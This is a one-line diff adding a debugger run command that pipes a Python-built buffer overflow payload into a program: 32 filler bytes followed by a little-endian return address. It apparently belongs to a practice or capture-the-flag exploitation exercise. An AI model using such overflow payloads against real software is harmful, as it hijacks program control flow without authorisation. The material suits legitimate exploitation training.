@@ -1,0 +1,1 @@
+r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x76\x11\x40\x00"+b"\x00"*4)')
